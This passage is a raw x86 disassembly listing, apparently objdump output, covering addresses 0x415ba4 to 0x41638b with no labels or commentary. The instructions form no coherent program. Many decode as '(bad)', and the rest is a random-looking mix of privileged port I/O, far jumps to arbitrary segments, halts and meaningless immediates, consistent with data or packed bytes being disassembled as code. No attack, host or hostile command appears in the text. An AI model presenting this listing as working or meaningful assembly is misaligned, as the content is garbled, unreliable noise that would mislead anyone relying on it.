  415ba4:	mov    dl,BYTE PTR [eax-0xb7829c0]
  415baa:	adc    edx,DWORD PTR [edi]
  415bac:	cmc    
  415bad:	mov    ebp,0x44b99925
  415bb2:	fbstp  TBYTE PTR [ebp+0x509f6e3e]
  415bb8:	pop    ecx
  415bb9:	dec    esp
  415bba:	loopne 0x415c1a
  415bbc:	inc    edi
  415bbd:	stos   BYTE PTR es:[edi],al
  415bbe:	out    dx,eax
  415bbf:	sbb    esp,DWORD PTR [eax-0x4d]
  415bc2:	rcl    al,0x88
  415bc5:	xchg   ebp,eax
  415bc6:	mov    WORD PTR [ecx],ss
  415bc8:	add    esi,DWORD PTR [ebx-0x6683ea44]
  415bce:	jle    0x415c1e
  415bd0:	and    eax,0x578d317c
  415bd5:	(bad)  
  415bd6:	stos   DWORD PTR es:[edi],eax
  415bd7:	out    0x63,al
  415bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bda:	cwde   
  415bdb:	inc    ecx
  415bdc:	pop    ecx
  415bdd:	enter  0xc451,0x64
  415be1:	(bad)  
  415be2:	fstp   QWORD PTR ds:0xd3b19aa9
  415be8:	nop
  415be9:	test   BYTE PTR [ebx-0x41676766],ch
  415bef:	dec    ecx
  415bf0:	test   BYTE PTR [ecx-0x6579e69d],dh
  415bf6:	retf   0x6e61
  415bf9:	jne    0x415c2e
  415bfb:	loope  0x415c6a
  415bfd:	test   cl,bl
  415bff:	imul   ebx,DWORD PTR [ebx-0x3ca3b008],0xc
  415c06:	mov    bl,BYTE PTR [edi]
  415c08:	xor    eax,0x2417b99
  415c0d:	ins    BYTE PTR es:[edi],dx
  415c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0f:	icebp  
  415c10:	jp     0x415c0b
  415c12:	adc    dh,BYTE PTR ds:0x82654af1
  415c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c19:	cmp    al,0x6a
  415c1b:	aad    0xd
  415c1d:	inc    ebx
  415c1e:	mov    ebx,0x7f2f525e
  415c23:	pop    edi
  415c24:	adc    edi,DWORD PTR [edx]
  415c26:	jno    0x415bc5
  415c28:	fadd   QWORD PTR [ebp+ecx*2-0x63]
  415c2c:	pop    ebx
  415c2d:	push   es
  415c2e:	or     cl,cl
  415c30:	jmp    0xb603:0xecc2322
  415c37:	retf   0x6080
  415c3a:	ins    BYTE PTR es:[edi],dx
  415c3b:	push   eax
  415c3c:	sub    eax,0x89638bfd
  415c41:	xlat   BYTE PTR ds:[ebx]
  415c42:	dec    esp
  415c43:	xchg   BYTE PTR [eax+0x5f7749b8],al
  415c49:	mov    edx,?
  415c4b:	adc    eax,0x76395058
  415c50:	add    eax,DWORD PTR [ecx-0xe527c06]
  415c56:	sub    esp,DWORD PTR [edi+ebx*8]
  415c59:	sbb    eax,0x4144b789
  415c5e:	sbb    edx,DWORD PTR [edi-0x224f688]
  415c64:	fsubr  QWORD PTR [ebx-0x4e]
  415c67:	dec    eax
  415c68:	jnp    0x415c9e
  415c6a:	dec    esp
  415c6b:	test   al,0x40
  415c6d:	jbe    0x415ccc
  415c6f:	adc    al,0x59
  415c71:	mov    dh,0x2
  415c73:	add    eax,0xa05e0f31
  415c78:	push   0xc8b65d02
  415c7d:	retf   
  415c7e:	lds    esp,FWORD PTR [eax]
  415c80:	mov    eax,0x35fc93ce
  415c85:	loop   0x415c17
  415c87:	fnsave [edx+0x36]
  415c8a:	fstp   DWORD PTR [ecx]
  415c8c:	push   ecx
  415c8d:	imul   DWORD PTR [edx]
  415c8f:	inc    ebx
  415c90:	and    esp,DWORD PTR [esi]
  415c92:	sbb    bh,BYTE PTR [esi]
  415c94:	inc    esp
  415c95:	push   edi
  415c96:	push   0x7bddb1ea
  415c9b:	out    dx,eax
  415c9c:	std    
  415c9d:	sub    eax,0xce278cd4
  415ca2:	out    0xad,al
  415ca4:	int    0x98
  415ca6:	pextrw edi,(bad),0xc5
  415ca8:	imul   DWORD PTR ds:[eax-0x4c]
  415cac:	fld    TBYTE PTR [esi+0x617d183e]
  415cb2:	add    eax,DWORD PTR [ecx+0x5b24ca6]
  415cb8:	sbb    DWORD PTR [ebx],eax
  415cba:	sbb    eax,0x6cef094f
  415cbf:	sub    BYTE PTR [eax+0x1355811f],ah
  415cc5:	fisubr DWORD PTR [edx-0xd0aa993]
  415ccb:	lahf   
  415ccc:	jge    0x415c96
  415cce:	push   ecx
  415ccf:	addr16 push cs
  415cd1:	ins    DWORD PTR es:[edi],dx
  415cd2:	clc    
  415cd3:	or     esi,DWORD PTR [ebp+0x7b]
  415cd6:	ja     0x415d4e
  415cd8:	xchg   edi,eax
  415cd9:	leave  
  415cda:	aaa    
  415cdb:	mov    ebx,esi
  415cdd:	out    dx,eax
  415cde:	and    BYTE PTR [ebx+0x302e4298],bh
  415ce4:	lods   eax,DWORD PTR ds:[esi]
  415ce5:	out    0x17,al
  415ce7:	sub    al,0x5a
  415cea:	nop
  415ceb:	std    
  415cec:	cdq    
  415ced:	jmp    0xe915:0xd4352421
  415cf4:	ds pusha 
  415cf6:	xor    al,0xcb
  415cf8:	das    
  415cf9:	lods   eax,DWORD PTR ds:[esi]
  415cfa:	xchg   ebp,eax
  415cfb:	jbe    0x415d19
  415cfd:	repz sub DWORD PTR [edi+ecx*4],ebp
  415d01:	stc    
  415d02:	mov    dl,0xad
  415d04:	jae    0x415d72
  415d06:	call   0x9da92ae9
  415d0b:	sti    
  415d0c:	cmp    al,0xcf
  415d0e:	cmp    ebx,DWORD PTR [eax+0x6970ebd5]
  415d14:	dec    eax
  415d15:	in     al,dx
  415d16:	setnp  BYTE PTR [eax+ecx*1-0x2bc67ca9]
  415d1e:	or     DWORD PTR [esi],0xffffffb3
  415d21:	rcl    esp,1
  415d23:	daa    
  415d24:	adc    cl,BYTE PTR [ebx+0x1a]
  415d27:	ds mov esi,0x18a0d544
  415d2d:	ins    BYTE PTR es:[edi],dx
  415d2e:	and    al,BYTE PTR [ecx]
  415d30:	mov    ds,ebx
  415d32:	int3   
  415d33:	sbb    ecx,esi
  415d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d36:	gs into 
  415d38:	ja     0x415d97
  415d3a:	icebp  
  415d3b:	fwait
  415d3c:	(bad)  
  415d3d:	retf   
  415d3e:	das    
  415d3f:	jmp    0x415d37
  415d41:	adc    eax,0x1f4d49d1
  415d46:	push   edi
  415d47:	xchg   BYTE PTR [ecx+0x43],ah
  415d4a:	xlat   BYTE PTR ds:[ebx]
  415d4b:	imul   edi,DWORD PTR [ecx+0x2b],0x6fb09348
  415d52:	xor    esp,edx
  415d54:	mov    ds:0x64f59971,al
  415d59:	push   0xc08297ff
  415d5e:	dec    ebx
  415d5f:	jmp    0xe0be68ba
  415d64:	cmp    edx,DWORD PTR [edx+0x7e4a72c5]
  415d6a:	shr    DWORD PTR [eax+0x6],1
  415d6d:	jmp    0x68f1a029
  415d72:	aaa    
  415d73:	cmc    
  415d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d75:	xchg   ebx,eax
  415d76:	mov    ah,0xfa
  415d78:	push   DWORD PTR [ecx+0x30]
  415d7b:	data16 jno 0x415d1e
  415d7e:	stos   BYTE PTR es:[edi],al
  415d7f:	jmp    0x415d76
  415d81:	cld    
  415d82:	add    BYTE PTR ds:0x4e39e258,bh
  415d88:	sbb    bh,BYTE PTR [edi-0x40346e7b]
  415d8e:	jo     0x415df8
  415d90:	jns    0x415d49
  415d92:	cmp    eax,ecx
  415d94:	mov    bl,0x73
  415d96:	sbb    ebx,DWORD PTR [edi+0x442fd716]
  415d9c:	loopne 0x415de7
  415d9e:	jmp    0xdb34740
  415da3:	dec    ebx
  415da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415da5:	repnz xlat BYTE PTR ds:[ebx]
  415da7:	popf   
  415da8:	inc    dl
  415daa:	dec    esp
  415dab:	sub    BYTE PTR [edi+0x3e],cl
  415dae:	stos   DWORD PTR es:[edi],eax
  415daf:	test   DWORD PTR [eax-0x26474478],0xf37ff326
  415db9:	ins    BYTE PTR es:[edi],dx
  415dba:	(bad)  
  415dbb:	jne    0x415d4a
  415dbd:	(bad)  [ebx+0x465b5bf5]
  415dc3:	pop    ds
  415dc4:	xor    cl,BYTE PTR [ecx-0x330f8262]
  415dca:	retf   
  415dcb:	jb     0x415e36
  415dcd:	cwde   
  415dce:	cmp    BYTE PTR [eax],ah
  415dd0:	mov    DWORD PTR [edx+0x474b9a0d],ebp
  415dd6:	inc    edi
  415dd7:	push   es
  415dd8:	mov    ds:0x7a50d0dc,al
  415ddd:	jne    0x415d68
  415ddf:	push   ebp
  415de0:	popa   
  415de1:	mov    dh,0x29
  415de3:	add    DWORD PTR [esi-0x17],eax
  415de6:	push   ss
  415de7:	or     DWORD PTR [edx],esp
  415de9:	mov    BYTE PTR [esi-0x6f],bh
  415dec:	or     al,0x11
  415dee:	and    dl,BYTE PTR [edi-0x631dfbac]
  415df4:	push   ss
  415df5:	cmp    eax,0x1135097f
  415dfa:	fldcw  WORD PTR [edi-0x61d6e2f]
  415e00:	(bad)  
  415e01:	sbb    esi,DWORD PTR [ebx+ecx*1]
  415e04:	das    
  415e05:	mov    BYTE PTR [edx],ch
  415e07:	rol    DWORD PTR [edi+0x11],cl
  415e0a:	mov    DWORD PTR [esi-0x2bf439e4],ebp
  415e10:	inc    esp
  415e11:	(bad)  
  415e12:	out    0xc9,al
  415e14:	inc    ebp
  415e15:	hlt    
  415e16:	jns    0x415dda
  415e18:	jmp    0x438d:0x5c6cae41
  415e1f:	and    BYTE PTR [ecx-0x4a],dl
  415e22:	(bad)  
  415e23:	xchg   ebx,eax
  415e24:	shr    BYTE PTR [edx+0x3],cl
  415e27:	lds    esi,FWORD PTR [edi]
  415e29:	xchg   edx,eax
  415e2a:	fadd   QWORD PTR [ebp-0x1a0d0f49]
  415e30:	cmp    edx,eax
  415e32:	jge    0x415dbb
  415e34:	std    
  415e35:	lahf   
  415e36:	mov    ds:0x97ea6660,al
  415e3b:	out    0xad,eax
  415e3d:	and    BYTE PTR [edi-0x68],bl
  415e40:	call   0xac5:0x597262f2
  415e47:	ss dec esi
  415e49:	outs   dx,BYTE PTR ds:[esi]
  415e4a:	out    dx,al
  415e4b:	adc    eax,0x98a943e7
  415e50:	and    eax,0x717e305
  415e55:	mov    eax,ds:0xde367697
  415e5a:	leave  
  415e5b:	push   ecx
  415e5c:	test   BYTE PTR [edx+0x38],bh
  415e5f:	adc    bl,BYTE PTR [ecx+0x4f]
  415e62:	shl    ch,1
  415e64:	adc    dh,BYTE PTR [ebx-0x63]
  415e67:	xor    eax,0xcc65323e
  415e6c:	add    ebp,DWORD PTR [ebp+0x40]
  415e6f:	mov    cl,0x9c
  415e71:	jmp    0x39a397fb
  415e76:	jecxz  0x415e4f
  415e78:	iret   
  415e79:	add    ebx,esi
  415e7b:	adc    eax,0xaf576491
  415e80:	lahf   
  415e81:	jns    0x415eb4
  415e83:	inc    edi
  415e84:	mov    al,ds:0x4220869b
  415e89:	aam    0xc3
  415e8b:	repz pop es
  415e8d:	outs   dx,BYTE PTR ds:[esi]
  415e8e:	mov    dl,0xba
  415e90:	xor    edx,ecx
  415e92:	sbb    dl,dh
  415e94:	and    BYTE PTR [edi+ecx*8+0x39e112c7],ch
  415e9b:	fnsave [edi]
  415e9d:	sub    al,0xfc
  415e9f:	jmp    0xe5fe:0x3df769cc
  415ea6:	add    eax,esp
  415ea8:	scas   eax,DWORD PTR es:[edi]
  415ea9:	aad    0xfc
  415eab:	lods   al,BYTE PTR ds:[esi]
  415eac:	and    dl,0xea
  415eaf:	jecxz  0x415e8c
  415eb1:	dec    esp
  415eb2:	fisub  WORD PTR ds:[ebp-0x39]
  415eb6:	xchg   al,dh
  415eb8:	or     BYTE PTR [ebx-0x7d],dl
  415ebb:	cwde   
  415ebc:	mov    bh,BYTE PTR [esi-0x7c9b76c2]
  415ec2:	cmovae ebx,DWORD PTR [esi]
  415ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec6:	cmp    al,0x67
  415ec8:	leave  
  415ec9:	arpl   WORD PTR [edx],sp
  415ecb:	fcmovbe st,st(3)
  415ecd:	xor    BYTE PTR [edx+ecx*1-0x6f],cl
  415ed1:	leave  
  415ed2:	pop    ebx
  415ed3:	aaa    
  415ed4:	adc    dh,BYTE PTR [ecx]
  415ed6:	fyl2xp1 
  415ed8:	push   esi
  415ed9:	dec    ebx
  415eda:	pop    edx
  415edb:	cmp    DWORD PTR [ecx+0x29],0x53c77586
  415ee2:	sbb    al,0x46
  415ee4:	or     eax,0x494b320a
  415ee9:	cmp    bh,dh
  415eeb:	xor    BYTE PTR [edi-0x60],0x32
  415eef:	aas    
  415ef0:	xor    al,0x6c
  415ef2:	test   BYTE PTR [ebx+ebx*4-0x2d058fbe],cl
  415ef9:	or     dh,dh
  415efb:	pop    ecx
  415efc:	rol    BYTE PTR [esi+0x8],1
  415eff:	int3   
  415f00:	out    dx,al
  415f01:	xchg   edi,eax
  415f02:	stos   BYTE PTR es:[edi],al
  415f03:	scas   eax,DWORD PTR es:[edi]
  415f04:	pop    edi
  415f05:	stos   DWORD PTR es:[edi],eax
  415f06:	jl     0x415e8f
  415f08:	leave  
  415f09:	xor    esi,ebx
  415f0b:	retf   0x56dc
  415f0e:	je     0x415ee8
  415f10:	jg     0x415f71
  415f12:	into   
  415f13:	lds    ecx,FWORD PTR [eax-0x69e4d4a3]
  415f19:	xor    esi,DWORD PTR [ebx+eiz*1-0x7a69072e]
  415f20:	fcom   DWORD PTR [ebp+esi*8-0x7e0bef8f]
  415f27:	icebp  
  415f28:	pop    ecx
  415f29:	(bad)  
  415f2a:	in     al,0x3
  415f2c:	adc    al,0xb9
  415f2e:	mov    al,0xcf
  415f30:	test   eax,0x7d16ea1
  415f35:	mov    es,ebx
  415f37:	cmp    al,0xe0
  415f39:	push   ax
  415f3b:	daa    
  415f3c:	in     al,dx
  415f3d:	dec    edx
  415f3e:	push   0xfeb9f38b
  415f43:	pop    esp
  415f44:	push   ecx
  415f45:	jne    0x415f09
  415f47:	out    dx,al
  415f48:	push   ebx
  415f49:	test   esp,edi
  415f4b:	test   ah,dl
  415f4d:	mov    eax,ds:0x78f60c39
  415f52:	mov    bh,0xaf
  415f54:	fiadd  WORD PTR [eax-0x28]
  415f57:	add    bh,BYTE PTR [esp+ebp*2-0x73cec349]
  415f5e:	mov    edx,ebp
  415f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f61:	ret    
  415f62:	adc    DWORD PTR [esi],eax
  415f64:	xchg   ebx,eax
  415f65:	imul   edx,DWORD PTR [ebx-0x2157a44b],0xa85a460
  415f6f:	cmp    BYTE PTR [eax+0x46f5fa4f],ah
  415f75:	mov    eax,ds:0x9e874db0
  415f7a:	jg     0x415f2f
  415f7c:	mov    dh,0x72
  415f7e:	jmp    0x415f4f
  415f80:	push   cs
  415f81:	dec    esp
  415f82:	or     bh,ah
  415f84:	sbb    eax,0xb75670f3
  415f89:	inc    eax
  415f8a:	jmp    0x860f28c7
  415f8f:	stc    
  415f90:	pop    edi
  415f91:	cwde   
  415f92:	fidivr DWORD PTR [ebp+0x74]
  415f95:	xor    DWORD PTR [ebx-0x31],esp
  415f98:	es lock out 0xec,al
  415f9c:	outs   dx,BYTE PTR ds:[esi]
  415f9d:	mov    WORD PTR [esi],ds
  415f9f:	fst    QWORD PTR [esi-0x121ba475]
  415fa5:	ret    
  415fa6:	push   ss
  415fa7:	and    eax,0x8fa5ad4b
  415fac:	inc    esp
  415fad:	jmp    0x5627:0x37e9bcc4
  415fb4:	push   esp
  415fb5:	loope  0x415fca
  415fb7:	pop    edx
  415fb8:	lods   al,BYTE PTR ds:[esi]
  415fb9:	mov    ebx,0x296969
  415fbe:	je     0x415fe9
  415fc0:	fnstsw WORD PTR [eax]
  415fc2:	sub    al,0x6b
  415fc4:	out    0x8c,al
  415fc6:	cwde   
  415fc7:	fs retf 0x8f60
  415fcb:	mov    esi,0xa3ad4c95
  415fd0:	inc    edi
  415fd1:	in     al,dx
  415fd2:	imul   ebp,DWORD PTR [esi+0x445ccf92],0x237105b8
  415fdc:	jb     0x415fad
  415fde:	dec    esp
  415fdf:	dec    ecx
  415fe0:	xchg   edi,eax
  415fe1:	std    
  415fe2:	jecxz  0x415fdd
  415fe4:	inc    esp
  415fe5:	push   es
  415fe6:	push   ss
  415fe7:	dec    ebp
  415fe8:	enter  0xe6e7,0x38
  415fec:	out    dx,al
  415fed:	mov    dl,0x55
  415fef:	fdivr  DWORD PTR [ecx+0x5]
  415ff2:	sub    BYTE PTR [edi],bh
  415ff4:	into   
  415ff5:	cmc    
  415ff6:	adc    al,0x54
  415ff8:	imul   esi,DWORD PTR [esi],0xb
  415ffb:	out    dx,eax
  415ffc:	cwde   
  415ffd:	cmp    BYTE PTR [edi+eax*1],ch
  416000:	icebp  
  416001:	or     al,0xf1
  416003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416004:	jno    0x41603f
  416006:	jmp    0x415ffd
  416008:	adc    BYTE PTR [eax-0x3e6c790e],0x83
  41600f:	clc    
  416010:	lock enter 0x611f,0x1
  416015:	sbb    cl,BYTE PTR [edx]
  416017:	scas   eax,DWORD PTR es:[edi]
  416018:	div    DWORD PTR [esi*2+0x5e379c35]
  41601f:	mov    bh,0x4
  416021:	cmp    edi,DWORD PTR [esi+0x3f5ba77f]
  416027:	vpmulhw xmm4,xmm0,XMMWORD PTR [ebx-0x7b]
  41602c:	js     0x41604d
  41602e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602f:	pop    ebp
  416030:	fwait
  416031:	add    BYTE PTR [esi+0x488d6917],cl
  416037:	shl    ecx,1
  416039:	sub    ebx,esp
  41603b:	or     eax,0xdf0343b7
  416040:	jnp    0x416065
  416042:	xor    eax,0xd23840b8
  416047:	push   0x1b
  416049:	ja     0x4160b4
  41604b:	shr    BYTE PTR [ecx-0x1d],cl
  41604e:	jnp    0x41606c
  416050:	dec    ebp
  416051:	aad    0x88
  416053:	pop    ss
  416054:	repz in eax,dx
  416056:	(bad)  
  416057:	int3   
  416058:	inc    edi
  416059:	hlt    
  41605a:	pop    ds
  41605b:	ss push ds
  41605d:	push   esp
  41605e:	fadd   DWORD PTR [ebx-0x1bfcf9d8]
  416064:	(bad)  
  416065:	daa    
  416066:	sub    eax,DWORD PTR [ebp-0x50]
  416069:	mov    al,ds:0x4015f19
  41606e:	dec    edx
  41606f:	sub    DWORD PTR [edi],ebp
  416071:	jbe    0x41605c
  416073:	aad    0xf7
  416075:	mov    edx,0xb108f54f
  41607a:	ret    0x5276
  41607d:	xor    DWORD PTR [esi+0x711e82d7],esi
  416083:	pop    es
  416084:	push   ss
  416085:	mov    BYTE PTR [edi],ah
  416087:	adc    BYTE PTR [esi+ebp*2+0x7d70bf74],ah
  41608e:	cli    
  41608f:	clc    
  416090:	xlat   BYTE PTR ds:[ebx]
  416091:	mov    edx,0xc63a46d2
  416096:	int    0x38
  416098:	push   es
  416099:	scas   eax,DWORD PTR es:[edi]
  41609a:	cmp    eax,0x3e83f340
  41609f:	jmp    0x7f71:0x3cee4fd1
  4160a6:	stos   BYTE PTR es:[edi],al
  4160a7:	push   ds
  4160a8:	mov    ebx,0xd9c4c342
  4160ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160ae:	ss jb  0x4160ce
  4160b1:	adc    eax,0x2e67ba41
  4160b6:	mov    ecx,0xa2085c0d
  4160bb:	data16 sub al,0xc
  4160be:	call   DWORD PTR [ebp+0x335e215d]
  4160c4:	fst    st(7)
  4160c6:	iret   
  4160c7:	dec    esi
  4160c8:	sub    BYTE PTR [edi],dh
  4160ca:	sub    cl,ch
  4160cc:	dec    ecx
  4160cd:	sub    BYTE PTR [eax+0x735baa6f],bl
  4160d3:	cmp    bh,BYTE PTR [eax+0x1db1176c]
  4160d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160da:	dec    ebx
  4160db:	mov    ah,dl
  4160dd:	and    ah,BYTE PTR [ecx-0x7e30bde1]
  4160e3:	mov    ds:0x539a683e,al
  4160e8:	imul   edx,DWORD PTR [edi-0x7a],0x3a97b46d
  4160ef:	es daa 
  4160f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f2:	sub    esi,DWORD PTR [edx]
  4160f4:	pop    ebx
  4160f5:	outs   dx,BYTE PTR ds:[esi]
  4160f6:	loop   0x416142
  4160f8:	mov    eax,0x513de997
  4160fd:	popa   
  4160fe:	mov    ah,0xeb
  416100:	add    eax,eax
  416102:	sub    BYTE PTR [ebx+0xea85863],cl
  416108:	(bad)  [eax+edx*2]
  41610b:	sti    
  41610c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41610d:	mov    ebx,0xab03ca13
  416112:	sub    esp,DWORD PTR [ebp-0x7b2e023]
  416118:	pop    ss
  416119:	cmp    DWORD PTR [esi+edi*1],0xffffffb4
  41611d:	fsub   st,st(4)
  41611f:	rcr    DWORD PTR [esi],0x1a
  416122:	repnz mov ah,bh
  416125:	mov    ds:0x84404f00,eax
  41612a:	fisubr WORD PTR [eax]
  41612c:	das    
  41612d:	in     eax,0x85
  41612f:	ds sti 
  416131:	int3   
  416132:	cmp    eax,0x632262c1
  416137:	push   cs
  416138:	js     0x41615a
  41613a:	into   
  41613b:	hlt    
  41613c:	jmp    0x5aed058e
  416141:	push   ebx
  416142:	push   ebp
  416143:	gs or  ah,0x9e
  416147:	retf   
  416148:	inc    ebx
  416149:	xchg   BYTE PTR [esi],bh
  41614b:	push   DWORD PTR [edi]
  41614d:	adc    DWORD PTR [edx+0x2c8ab121],esp
  416153:	dec    esi
  416154:	dec    eax
  416155:	addr16 xchg edi,eax
  416157:	jmp    0xcea8381f
  41615c:	dec    ebx
  41615d:	push   edi
  41615e:	inc    ebx
  41615f:	stos   DWORD PTR es:[edi],eax
  416160:	test   eax,ebx
  416162:	aam    0xd1
  416164:	dec    eax
  416165:	push   ecx
  416166:	dec    ebp
  416167:	idiv   DWORD PTR [ebx]
  416169:	pop    ebx
  41616a:	mov    esi,0x6d4e37c5
  41616f:	cwde   
  416170:	repz test eax,0x21e1855f
  416176:	fwait
  416177:	mov    dh,0x97
  416179:	int3   
  41617a:	rcr    edi,0x77
  41617d:	add    al,0xa
  41617f:	nop
  416180:	mov    dh,0xe5
  416182:	in     eax,dx
  416183:	call   DWORD PTR [edi]
  416185:	ffree  st(4)
  416187:	inc    ecx
  416188:	mov    ecx,0xa505dbf2
  41618d:	(bad)  
  41618e:	icebp  
  41618f:	and    BYTE PTR [edi-0x68870caf],cl
  416195:	and    eax,0x988bd974
  41619a:	push   esi
  41619b:	or     dl,BYTE PTR [edx-0x2ab04a8f]
  4161a1:	inc    edx
  4161a2:	(bad)  [esi]
  4161a4:	pop    esp
  4161a5:	sbb    bh,0xe1
  4161a8:	iret   
  4161a9:	inc    edx
  4161aa:	sub    DWORD PTR [edi],esi
  4161ac:	in     al,dx
  4161ad:	xor    dh,BYTE PTR [eax+0x25]
  4161b0:	dec    esp
  4161b1:	cmc    
  4161b2:	mov    edi,ebp
  4161b4:	(bad)  
  4161b6:	or     bl,BYTE PTR ds:0xc1f8e7dc
  4161bc:	jnp    0x416149
  4161be:	xchg   edi,eax
  4161bf:	into   
  4161c0:	and    bl,bl
  4161c2:	dec    esi
  4161c3:	fiadd  WORD PTR [esi]
  4161c5:	sub    DWORD PTR [eax+0xf],ebp
  4161c8:	mov    eax,0x23739a98
  4161cd:	pop    es
  4161ce:	scas   eax,DWORD PTR es:[edi]
  4161cf:	push   ss
  4161d0:	in     eax,dx
  4161d1:	out    0xb4,al
  4161d3:	int    0x28
  4161d5:	dec    ebx
  4161d6:	fwait
  4161d7:	sbb    eax,0xedbe0d33
  4161dc:	mov    dh,0x80
  4161de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161df:	push   cs
  4161e0:	inc    edi
  4161e1:	inc    ebp
  4161e2:	enter  0x4ab8,0x20
  4161e6:	div    DWORD PTR [esi+0x4309ad54]
  4161ec:	popa   
  4161ed:	addr16 push ds
  4161ef:	(bad)  
  4161f0:	and    eax,0x7e213b31
  4161f5:	mov    BYTE PTR [edx+ecx*1-0x43],0x7d
  4161fa:	(bad)  
  4161fb:	in     eax,0x4e
  4161fd:	xchg   esi,eax
  4161fe:	out    dx,al
  4161ff:	repz or eax,0xbaab7003
  416205:	in     eax,dx
  416206:	mov    esp,0x6e54098c
  41620b:	and    DWORD PTR [edi+0x38446e3c],eax
  416211:	daa    
  416212:	std    
  416213:	sbb    esi,ebp
  416215:	mov    cl,BYTE PTR [edi+eax*8-0x266a60b2]
  41621c:	nop
  41621d:	cdq    
  41621e:	ret    
  41621f:	fld    DWORD PTR [ecx+0x35c14f0]
  416225:	loopne 0x41620c
  416227:	(bad)  
  416228:	adc    BYTE PTR fs:[esp+ebp*4+0x2f],bh
  41622d:	dec    esp
  41622e:	or     ebp,DWORD PTR [ecx-0x3]
  416231:	push   esi
  416232:	add    eax,0x1463e9d9
  416237:	add    ah,BYTE PTR [esi]
  416239:	push   edi
  41623a:	in     al,0x49
  41623c:	enter  0x34c1,0xb7
  416240:	mov    BYTE PTR [ecx-0x4552467b],dl
  416246:	mov    esp,0x446dd2f4
  41624b:	ret    0xd2b7
  41624e:	cwde   
  41624f:	add    ecx,DWORD PTR ds:0x31c90197
  416255:	cld    
  416256:	jno    0x416201
  416258:	mov    bl,0x4
  41625a:	add    BYTE PTR [edx+0x54],0x7d
  41625e:	jl     0x41622a
  416260:	push   ds
  416261:	xchg   edi,eax
  416262:	ret    
  416263:	(bad)  
  416264:	in     eax,dx
  416265:	jne    0x4162b0
  416267:	inc    eax
  416268:	test   BYTE PTR [ebx-0x72eebb57],dl
  41626e:	imul   esp,eax,0x33150967
  416274:	fnstsw WORD PTR [esp+esi*4]
  416277:	sbb    BYTE PTR [edi-0x4e],0x38
  41627b:	mov    BYTE PTR [ebx],al
  41627d:	xchg   DWORD PTR [edx+0x1eb515b1],ebx
  416283:	pusha  
  416284:	dec    edi
  416285:	icebp  
  416286:	cmp    eax,0x595a05dc
  41628b:	jae    0x4162c2
  41628d:	lods   al,BYTE PTR ds:[esi]
  41628e:	sbb    BYTE PTR [ebp+0x43],cl
  416291:	sbb    bl,BYTE PTR [ecx]
  416293:	hlt    
  416294:	or     BYTE PTR [edi],bh
  416296:	mov    ds:0x782a0044,eax
  41629b:	in     eax,dx
  41629c:	loopne 0x416269
  41629e:	or     eax,0xc6665b72
  4162a3:	jo     0x41629e
  4162a5:	mov    eax,0x11f7a2f1
  4162aa:	jl     0x416303
  4162ac:	lods   al,BYTE PTR ds:[esi]
  4162ad:	ss cmp BYTE PTR ss:[edi],al
  4162b1:	ja     0x4162db
  4162b3:	stc    
  4162b4:	cmp    edx,DWORD PTR [ebx]
  4162b6:	sbb    al,0x2a
  4162b8:	adc    esi,ebp
  4162ba:	mov    ebp,0xa053a585
  4162bf:	enter  0x50e4,0x71
  4162c3:	jne    0x416271
  4162c5:	dec    eax
  4162c6:	adc    ecx,DWORD PTR [edx-0x54d037da]
  4162cc:	sahf   
  4162cd:	addr16 call 0x32c4:0xb817bcec
  4162d5:	inc    esi
  4162d6:	mov    bh,0x39
  4162d8:	cmc    
  4162d9:	or     BYTE PTR [esi-0x3a],cl
  4162dc:	out    dx,eax
  4162dd:	cmp    eax,0x2cf80c80
  4162e2:	xor    eax,0xb68a46ba
  4162e7:	mov    WORD PTR [ecx],ss
  4162e9:	daa    
  4162ea:	xchg   ecx,eax
  4162eb:	std    
  4162ec:	mov    ecx,0xdc11003a
  4162f1:	test   eax,0x66f41afb
  4162f6:	not    DWORD PTR ds:0x28339018
  4162fc:	pop    esp
  4162fd:	bound  edx,QWORD PTR ds:0x6d1394e6
  416303:	cli    
  416304:	push   ss
  416305:	cwde   
  416306:	add    BYTE PTR [ebx-0x64aa9d0c],ch
  41630c:	inc    edx
  41630d:	icebp  
  41630e:	fld    TBYTE PTR [eax+0x657faacb]
  416314:	cld    
  416315:	fwait
  416316:	push   0x4231d728
  41631b:	ds into 
  41631d:	mov    bh,0x29
  41631f:	and    ah,0x44
  416322:	imul   ebx,DWORD PTR [esi],0x4
  416325:	xchg   dh,ah
  416327:	es hlt 
  416329:	retf   0x7868
  41632c:	pop    ss
  41632d:	and    ecx,DWORD PTR [eax]
  41632f:	(bad)  
  416331:	xchg   esi,eax
  416332:	jg     0x41630e
  416334:	mov    esp,0x24735fc1
  416339:	fwait
  41633a:	js     0x41630c
  41633c:	push   ecx
  41633d:	cmp    ch,BYTE PTR [ebp-0x6e50355f]
  416343:	test   ebp,0xe5cee338
  416349:	icebp  
  41634a:	enter  0x5a96,0xa1
  41634e:	call   0x39a7:0x8341dc72
  416355:	stc    
  416356:	add    dl,BYTE PTR [edi+0x3b]
  416359:	fwait
  41635a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41635b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635c:	or     esi,DWORD PTR [ecx]
  41635e:	add    esp,esp
  416360:	sbb    eax,0x7bfd5e05
  416365:	push   0xe37e1993
  41636a:	nop
  41636b:	pop    ss
  41636c:	(bad)  
  41636d:	enter  0xc45d,0x44
  416371:	xor    ah,BYTE PTR [ecx-0x32fae281]
  416377:	shl    DWORD PTR [edx],1
  416379:	mov    edx,0xa2fbddb5
  41637e:	sub    eax,0xcb953c9d
  416383:	pop    eax
  416384:	dec    edi
  416385:	enter  0x9c12,0x5c
  416389:	pop    edx
  41638a:	daa    
  41638b:	sti    
